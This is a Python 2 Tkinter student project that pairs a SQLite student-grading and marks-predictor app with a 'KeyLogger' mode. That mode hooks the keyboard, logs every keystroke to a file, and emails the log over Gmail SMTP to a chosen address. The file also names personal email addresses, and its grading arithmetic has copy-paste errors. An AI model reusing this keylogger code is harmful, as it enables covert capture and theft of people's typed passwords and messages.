from Tkinter import *
import sqlite3
from tkMessageBox import *
from tkSimpleDialog import *
import pyHook
import sys
import logging
import pythoncom
import smtplib
import time
import webbrowser
import pyttsx

con=sqlite3.Connection('Rahul student grading db')
cur=con.cursor()
root=Tk()
root.title("PROJECT ALPHA ")
root.geometry("2000x1000")


cur.execute("create table if not exists students (idno number ,first varchar(20),last varchar(20),cname varchar(20),dept varchar(20),address varchar(50),mob number,internal number,de1 number,de2 number,db1 number,db2 number,maths1 number,maths2 number,oops1 number,oops2 number,me1 number,me2 number )")

def rahul():
    c.destroy() 
    a=IntVar()
    b=IntVar()

    e=IntVar()
    f=IntVar()
    g=IntVar()
    h=IntVar()

    Label(root,text="STUDENT  GRADING SYSTEM: ",font="Arial 40 bold",bd=30,fg="purple").grid(row=0,column=0,columnspan=50,sticky="W")
    
    Label(root,text="Enter Enrollment Number:",font="bold").grid(row=1,column=0,sticky=W)
    idno=Entry(root,width=30,bd=10)
    idno.grid(row=1,column=1)

    Label(root,text="Enter first name:",font="bold",fg="blue").grid(row=2,column=0,sticky=W)
    first=Entry(root,width=30,bd=10)
    first.grid(row=2,column=1)

    Label(root,text="Enter Last Name:",font="bold",fg="orange").grid(row=3,column=0,sticky=W)
    last=Entry(root,width=30,bd=10)
    last.grid(row=3,column=1)

    Label(root,text="Please select your coursename:",font="bold",fg="green").grid(row=4,column=0,sticky=W,pady=5)
    Radiobutton(root,text="B.Tech",variable=a,value=40).grid(row=4,column=1,pady=5,padx=40)
    Radiobutton(root,text="M.tech",variable=a,value=50).grid(row=4,column=2,pady=5,padx=40)
    Radiobutton(root,text="Phd",variable=a,value=60).grid(row=4,column=3,pady=5,padx=40)

    Label(root,text="Please select your branch:",font="bold",fg="red").grid(row=5,column=0,sticky=W,pady=5)
    Radiobutton(root,text="CSE",variable=b,value=40).grid(row=5,column=1,pady=5,padx=40)
    Radiobutton(root,text="IT",variable=b,value=50).grid(row=5,column=2,pady=5,padx=40)
    Radiobutton(root,text='ECE',variable=b,value=60).grid(row=5,column=3,pady=5,padx=40)
    Radiobutton(root,text='EE',variable=b,value=70).grid(row=5,column=4,pady=5,padx=40)
    Radiobutton(root,text='ME',variable=b,value=80).grid(row=5,column=5,pady=5,padx=40)
    Radiobutton(root,text='CE',variable=b,value=90).grid(row=5,column=6,pady=5,padx=40)
    Radiobutton(root,text='CHE',variable=b,value=100).grid(row=5,column=7,pady=5,padx=40)

    Label(root,text="Enter student address:",font="bold",fg="blue").grid(row=6,column=0,sticky=W)
    address=Entry(root,width=30,bd=10)
    address.grid(row=6,column=1)
    
    Label(root,text="Enter mobile number:",font="bold",fg="orange").grid(row=7,column=0,sticky=W)
    mob=Entry(root,width=30,bd=10)
    mob.grid(row=7,column=1)
      
    Label(root,text="Enter your Average internal marks(/25)",font="bold",fg="green").grid(row=8,column=0,sticky=W)
    internal=Entry(root,width=30,bd=10)
    internal.grid(row=8,column=1)
    
    Label(root,text="Select the Term/s you want to enter your marks",font="bold",fg="purple").grid(row=9,column=0,sticky=W)
    Checkbutton(root,text="T1",variable=e,onvalue=10).grid(row=9,column=1,sticky=W,pady=5,padx=40)
    Checkbutton(root,text="T2",variable=f,onvalue=20).grid(row=9,column=2,sticky=W,pady=5,padx=40)
    Checkbutton(root,text="T3",variable=g,onvalue=30).grid(row=9,column=3,sticky=W,pady=5,padx=40)
    
    Label(root,text="Select Your Overall CGPA",font="bold",fg="blue").grid(row=10,column=0,sticky=W)
    Radiobutton(root,text="10.0",variable=h,value=80).grid(row=10,column=1,sticky=W,pady=5,padx=40)
    Radiobutton(root,text="9.0",variable=h,value=70).grid(row=10,column=2,sticky=W,padx=40,pady=5)
    Radiobutton(root,text="8.0",variable=h,value=60).grid(row=10,column=3,sticky=W,padx=40,pady=5)
    Radiobutton(root,text="7.0",variable=h,value=50).grid(row=11,column=1,sticky=W,padx=40,pady=5)
    Radiobutton(root,text="6.0",variable=h,value=40).grid(row=11,column=2,sticky=W,padx=40,pady=5)
    Radiobutton(root,text="5.0",variable=h,value=30).grid(row=11,column=3,sticky=W,padx=40,pady=5)

    Label(root,text="Update on Basis of Enrollment number",font="bold",fg="gold").grid(row=12,column=0,sticky=W)
    update=Entry(root,width=30,bd=10)
    update.grid(row=12,column=1) 

    Label(root,text="Search on basis of enrollment Number",font="bold",fg="red").grid(row=13,column=0,sticky=W)
    searchno=Entry(root,width=30,bd=10)
    searchno.grid(row=13,column=1)

    Label(root,text="Search on Basis of first name",font="bold").grid(row=14,column=0,sticky=W)
    searchname=Entry(root,width=30,bd=10)
    searchname.grid(row=14,column=1)

    engine.setProperty('rate',135)
    engine.say('Welcome to Student Management System Mode')
    engine.runAndWait()

    def xyz():
        if a.get()==40:
            l="B.Tech"
        elif a.get()==50:
             l="M.Tech"
        else :
             l="Phd"

        if b.get()==40: m="CSE"
        elif b.get()==50: m="IT"
        elif b.get()==60: m="ECE"
        elif b.get()==70: m="EE"
        elif b.get()==80: m="ME"
        elif b.get()==90: m="CE"
        else :m="CHE"

        print a,b
        x=(l,m)
        return x



    def t1t2t3():
           de1=de2=db1=db2=maths1=maths2=me1=me2=oops1=oops2=0
           if e.get()==10 and f.get()==0 and g.get()==0:
                while 1:
                  de1=askinteger('Digital Electronics',"Enter your marks in T1 in Digital Electronics")
                  if de1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Digital Electronics')

                while 1:
                  db1=askinteger('Database Management System',"Enter your marks in T1 in Database systems")
                  if db1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Database Management System')

                
                while 1:
                  maths1=askinteger('Maths','Enter your marks in T1 in Maths')
                  if maths1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Maths')
                
                while 1:
                  oops1=askinteger('Object Oriented Programming',"Enter your marks in T1 in Object Oriented Programming")
                  if oops1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Object Oriented Programming')
        
                while 1:
                  me1=askinteger('Managerial Economics',"Enter your marks in T1 in Managerial Economics")
                  if me1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Managerial Economics')

           else :

                while 1:
                  de1=askinteger('Digital Electronics',"Enter your marks in T1 in Digital Electronics")
                  if de1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Digital Electronics')
                
                while 1:
                  de2=askinteger('Digital Electronics',"Enter your marks in T2 in Digital Electronics")
                  if de2<=25:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 25 in Digital Electronics')
                 
                while 1:
                  db1=askinteger('Database Management System',"Enter your marks in T1 in Database systems")
                  if db1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Database Management System')
                
                while 1:
                  db2=askinteger('Database Management System',"Enter your marks in T2 in Database systems")
                  if db2<=25:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 25 in Database Management System')

                
                while 1:
                  maths1=askinteger('Maths','Enter your marks in T1 in Maths')
                  if maths1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Maths')
                
                while 1:
                  maths2=askinteger('Maths','Enter your marks in T2 in Maths')
                  if maths2<=25:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 25 in Maths')
                

                while 1:
                  oops1=askinteger('Object Oriented Programming',"Enter your marks in T1 in Object Oriented Programming")
                  if oops1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Object Oriented Programming')
                
                while 1:
                  oops2=askinteger('Object Oriented Programming',"Enter your marks in T2 in Object Oriented Programming")
                  if oops2<=25:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 25 in Object Oriented Programming')

                 
                while 1:
                  me1=askinteger('Managerial Economics',"Enter your marks in T1 in Managerial Economics")
                  if me1<=15:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 15 in Managerial Economics')

                while 1:
                  me2=askinteger('Managerial Economics',"Enter your marks in T2 in Managerial Economics")
                  if me2<=25:
                    break
                  else:
                    showwarning('Warning','You have entered marks greater than 25 in Managerial Economics')


           l=[de1,de2,db1,db2,maths1,maths2,oops1,oops2,me1,me2]
           return l        

    def insertshowdetails():
        
        while 1:
          if len(str(mob.get()))!=10:
               showerror("Mobile number","Mobile Number should be of 10 digits")
               mob.delete(0,30)
               j=askinteger('Mobile Number',"Enter your new mobile number")
               mob.insert(0,j)
          else:
               break
        

        while 1:
            if int(internal.get())>25:
                showerror("Internal","Internal marks should be less than 25")
                internal.delete(0,30)
                j=askinteger('Internal',"Enter your New Internal Marks")
                internal.insert(0,j)
            else:
                break    


        a=xyz()
        m=t1t2t3()
        de1,de2,db1,db2,maths1,maths2,oops1,oops2,me1,me2=m[0],m[1],m[2],m[3],m[4],m[5],m[6],m[7],m[8],m[9]
        l=(idno.get(),first.get(),last.get(),a[0],a[1],address.get(),mob.get(),internal.get(),de1,de2,db1,db2,maths1,maths2,oops1,oops2,me1,me2)
        cur.execute("insert into students values(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",l)
        con.commit()
        showinfo('Insertion','Data has been inserted succesfully')
        j=int(internal.get())
        if e.get()==10 and f.get()==0 and g.get()==0:
            if h.get()==80:
                de1=80-j-de1
                db1=80-j-db1
                maths1=80-j-maths1
                oops1=80-j-oops1
                me1=80-j-me1
                z=10.0
            elif h.get()==70:
                de1=70-j-de1
                db1=70-j-db1
                maths1=70-j-maths1
                oops1=70-j-oops1
                me1=70-j-me1
                z=9.0
            elif h.get()==60:
                de1=60-j-de1
                db1=60-j-db1
                maths1=60-j-maths1
                oops1=60-j-oops1
                me1=60-j-me1
                z=8.0
            elif h.get()==50:
                de1=50-j-de1
                db1=50-j-db1
                maths1=50-j-maths1
                oops1=50-j-oops1
                me1=50-j-me1
                z=7.0
            elif h.get()==40:
                de1=40-j-de1
                db1=40-j-db1
                maths1=40-j-maths1
                oops1=40-j-oops1
                me1=40-j-me1
                z=6.0
            elif  h.get()==30:
                de1=30-j-de1
                db1=30-j-db1
                maths1=30-j-maths1
                oops1=30-j-oops1
                me1=30-j-me1
                z=5.0 

            dex=de1/2
            if dex>25:
                dex=25
                dey=de1-25
            else:    
                dey=de1-dex

        
            dbx=db1/2
            if dbx>25:
                dbx=25
                dey=de1-25
            else:    
                dby=db1-dbx
            

            mathsx=maths1/2
            if mathsx>25:
                mathsx=25
                mathsy=maths1-25
            else:    
                mathsy=maths1-mathsx

            oopsx=oops1/2
            if oopsx>25:
                oopsx=25
                oopsy=oops1-25
            else: 
                oopsy=oops1-oopsx
            

            mex=me1/2
            if mex>25:
                mex=25
                mey=me1-25
            else:    
                mey=me1-mex
        
            l="Out of 25 and 35 in T2 and T3 your require"+str(dex)+','+str(dey)+" in Digital Electronics, "+str(dbx)+","+str(dby)+"in Database, "
            m=str(mathsx)+","+str(mathsy)+"in Mathematics, "+str(oopsx)+","+str(oopsy)+" in Object Oriented Programming, "+str(mex)+","+str(mey)+" in Managerial Economics"
            n="to get a sgpa of"+str(z)
            showinfo('result',l+m+n)

        else:
            if h.get()==80:
                de1=80-j-de1-de2
                db1=80-j-db1-db2
                maths1=80-j-maths1-maths2
                oops1=80-j-oops1-oops2
                me1=80-j-me1-me2
                z=10.0
            elif h.get()==70:
                de1=70-j-de1-de2
                db1=70-j-db1-db2
                maths1=70-j-maths1-maths2
                oops1=70-j-oops1-oops2
                me1=70-j-me1-me2
                z=9.0
            elif h.get()==60:
                de1=60-j-de1-de2
                db1=60-j-db1-db2
                maths1=60-j-maths1-maths2
                oops1=60-j-oops1-oops2
                me1=60-j-me1-me2
                z=8.0
            elif h.get()==50:
                de1=50-j-de1-de2
                db1=50-j-db1-db2
                maths1=50-j-maths1-maths2
                oops1=50-j-oops1-oops2
                me1=50-j-me1-me2
                z=7.0
            elif h.get()==40:
                de1=40-j-de1-de2
                db1=40-j-db1-db2
                maths1=40-j-maths1-maths2
                oops1=40-j-oops1-oops2
                me1=40-j-me1-me2
                z=6.0
            elif  h.get()==30:
                de1=30-j-de1-de2
                db1=30-j-db1-db2
                maths1=30-j-maths1-maths2
                oops1=30-j-oops1-oops2
                me1=30-j-me1-me2
                z=5.0

            l="Out of 35 in T3 your require "+str(de1)+" in Digital Electronics, "+str(db1)+"in Database, "
            m=str(maths1)+" in Mathematics, "+str(oops1)+" in Object Oriented Programming, "+str(me1)+" in Managerial Economics"
            n="to get a sgpa of"+str(z)
            showinfo('result',l+m+n)

        idno.delete(0,30)
        first.delete(0,30)
        last.delete(0,30)
        address.delete(0,30)
        mob.delete(0,30)
        internal.delete(0,30)


    def  updateerno():
        b=update.get()
        showwarning('Warning',"Make sure you have filled all fields")
        a=xyz()
        x=askinteger('Update','Do you want to update T1 marks or T2 marks  1-T1 marks  2-T2 marks')
        if x==1:
            x1=askinteger('Digital Electronics',"Enter your marks in T1 in Digital Electronics")
            x2=askinteger('Database Management System',"Enter your marks in T1 in Database systems")
            x3=askinteger('Maths','Enter your marks in T1 in Maths')
            x4=askinteger('Object Oriented Programming',"Enter your marks in T1 in oops")
            x5=askinteger('Managerial Economics',"Enter your marks in T1 in Managerial Economics")
        else :
            x1=askinteger('Digital Electronics',"Enter your marks in T2 in Digital Electronics")
            x2=askinteger('Database Management System',"Enter your marks in T2 in Database systems")
            x3=askinteger('Maths','Enter your marks in T2 in Maths')
            x4=askinteger('Object Oriented Programming',"Enter your marks in T2 in oops")
            x5=askinteger('Managerial Economics',"Enter your marks in T2 in Managerial Economics")
            
        if x==1:  
            cur.execute("update students set  first=? ,last=?, cname=?, dept=?, address=?, mob=? ,internal=? ,de1=?, db1=?, maths1=? ,oops1=?, me1=? where idno=(?) ",(first.get(),last.get(),a[0],a[1],address.get(),mob.get(),internal.get(),x1,x2,x3,x4,x5,b ) )
        else:
            cur.execute("update  students set first=? ,last=? ,cname=?, dept=? ,address=?, mob=? ,internal=?, de2=?, db2=? ,maths2=? ,oops2=? ,me2=? where idno=(?) ",(first.get(),last.get(),a[0],a[1],address.get(),mob.get(),internal.get(),x1,x2,x3,x4,x5,b ) )
        con.commit()

        showinfo('update','Updation Successfull')
        idno.delete(0,30)
        first.delete(0,30)
        last.delete(0,30)
        address.delete(0,30)
        mob.delete(0,30)
        internal.delete(0,30)
        update.delete(0,30)

    def searchonbasisoferno():
        a=searchno.get()
        cur.execute("select * from students where idno=(?)",(a,))
        showwarning('Warning','Five or more alternate zeroes means data has not been entered for T2')
        a=cur.fetchall()
        showinfo('Enrollment number',a)
        searchno.delete(0,30)

    def searchonbasisofname():
        a=searchname.get()
        cur.execute("select * from students where first=(?)",(a,))
        showwarning('Warning','Five or more alternate zeroes means data has not been entered for T2')
        a=cur.fetchall()
        showinfo('Name',a)
        searchname.delete(0,30)

    def showall():
        cur.execute("select * from students")
        showwarning('Warning','Five or more alternate zeroes means data has not been entered for T2')
        a=cur.fetchall()
        showinfo('all',a)


    Button(root,text='Insert and Show details ',command=insertshowdetails,bg="black",fg="white").grid(row=15,column=0,sticky=W,padx=20,pady=5)
    Button(root,text='Update ',command=updateerno,bg="black",fg="white").grid(row=15,column=1,sticky=W,padx=20,pady=5)
    Button(root,text='Showall',command=showall,bg="black",fg="white").grid(row=15,column=2,sticky=W,padx=20,pady=5)
    Button(root,text='Enrollment Number Search',command=searchonbasisoferno,bg="black",fg="white").grid(row=16,column=0,sticky=W,padx=20,pady=5)
    Button(root,text='First Name Search',command=searchonbasisofname,bg="black",fg="white").grid(row=16,column=1,sticky=W,padx=20,pady=5)
    

def pythonkey():

            filelog="C:\\Users\\Rahul Verma\\Desktop\\rahullogs.txt"
            def onkeyboard(event):
                logging.basicConfig(filename=filelog,level=logging.DEBUG,format='%(message)s')
                #chr(event.Ascii)
                logging.log(10,chr(event.Ascii))
                return True

            hooksmanager=pyHook.HookManager()
            hooksmanager.KeyDown=onkeyboard
            hooksmanager.HookKeyboard()

            while True:    
              try:
                     while True:
                      pythoncom.PumpWaitingMessages()
              except KeyboardInterrupt:
                    root6=Tk()

                    #here add your address instead
                    fromaddr = 'rv404674@gmail.com'
                    toaddrs=askstring('reciever','enter email address of receiver')
                    #toaddrs  = 'sr.kush1997@gmail.com'
                    f=open('C:\\Users\\Rahul Verma\\Desktop\\rahullogs.txt')
                    msg = f.read()
                    f.close()


                    # Credentials (if needed)
                    #change this email address to yours
                    username = 'rv404674@gmail.com'
                    password=askstring('password','Enter Password of sender')

                    # The actual mail send
                    #it will only for gmail
                    server = smtplib.SMTP('smtp.gmail.com:587',timeout=120)
                    server.ehlo()
                    server.starttls()
                    server.login(username,password)
                    
                    engine.setProperty('rate',120)
                    engine.say('I am sending your mail . It will take 2-4 minutes')
                    engine.runAndWait()

                    server.sendmail(fromaddr, toaddrs, msg)
                    #it is url my inbox,change this to yours
                    webbrowser.open('https://mail.google.com/mail/u/0/#sent')
                    server.quit()
                    showinfo('THANKYOU','You have successfully exited from the server')
                    sys.exit()

                    root.mainloop()
                    
            pythoncom.PumpWaitingMessages()        
     

def key():
    a=PhotoImage(file="C:\\Users\\Rahul Verma\\Downloads\\python\\kali.gif")
    Label(root,image=a).grid(row=0,column=0)
    Label(root,image=a,compound="center",text="Python Developer- RAHUL VERMA 151364",font="Arial 40 bold",fg="white",bg="black").grid(row=0,column=0)

    engine.setProperty('rate',120)
    engine.say('Welcome to Keylogger Mode ')
    engine.runAndWait()

    showinfo("Message","Type Something and press cltrl+c to exit the keylogger")
    showinfo("MAIL","The keys you pressed will be automatically sent to another person using mail")
    pythonkey()




Button(root,text="Student Management System",command=rahul,bg="purple",width=30,font="Arial 15 bold").grid(row=0,column=0,padx=10,pady=10)
c=Button(root,text="KeyLogger",command=key,bg="orange",width=30,font="Arial 15 bold")
c.grid(row=1,column=0,padx=10,pady=10)
a=PhotoImage(file="C:\\Users\\Rahul Verma\\Downloads\\python\\python (1).gif")
Label(root,image=a).grid(row=0,column=5)
Label(root,text="Python Developer- RAHUL VERMA 151364",fg="white",bg="black",font="Arial 10 bold ").grid(row=1,column=5)

engine=pyttsx.init()
engine.setProperty('rate',123)
voices=engine.getProperty('voices')
engine.say('Hi what is your name')
engine.runAndWait()
name=askstring('Name','Enter your name')

engine.setProperty('rate', 135)
engine.say('hello'+name+', press 1 for info part or , press 0 to skip the info part') 
engine.runAndWait()

rahul=askinteger('CHOICE','press 1 to know the details of this project or 0 to skip detils part')

while rahul==1:
    engine.setProperty('rate',135)
    engine.say('hello'+ name +' I am project alpha , developed by rahul verma enrollment number-151364')
    engine.runAndWait()
    
    engine.setProperty('rate',143)
    engine.say(" I'm having two modes , first mode is a student marks predictor , based on marking scheme of juet for cse students , i'll tell your marks in t2 or t3 based on your performance in t1 or t2 respectively")
    engine.setProperty('voice',voices[1].id)#change index to change voices
     
    engine.setProperty('rate',143)
    engine.say('second mode is a keylogger that records your keys and , saves them in a text file on your desktop . After that it automatically redirects that file to a given email address')
    engine.say('You can now continue')
    engine.runAndWait()
    break

root.mainloop()
sys.exit()
